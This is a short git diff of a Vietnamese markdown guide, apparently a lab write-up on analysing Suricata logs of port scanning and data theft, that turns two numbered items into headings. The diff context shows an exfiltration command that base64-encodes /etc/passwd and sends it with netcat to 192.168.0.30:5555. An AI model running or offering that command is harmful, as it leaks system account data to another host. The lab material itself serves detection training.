@@ -137,7 +137,7 @@ cat /etc/passwd | base64 | nc 192.168.0.30 5555
 
 ### Bước 5: Phân tích log
 
-1. Log của hành vi quét cổng
+#### Log của hành vi quét cổng
 
 ```
 { [-]
@@ -183,7 +183,7 @@ cat /etc/passwd | base64 | nc 192.168.0.30 5555
     sourcetype = suricata
 ```
 
-2. Log của hành vi trích xuất thông tin nhạy cảm
+#### Log của hành vi trích xuất thông tin nhạy cảm
 
 ```
 { [-]
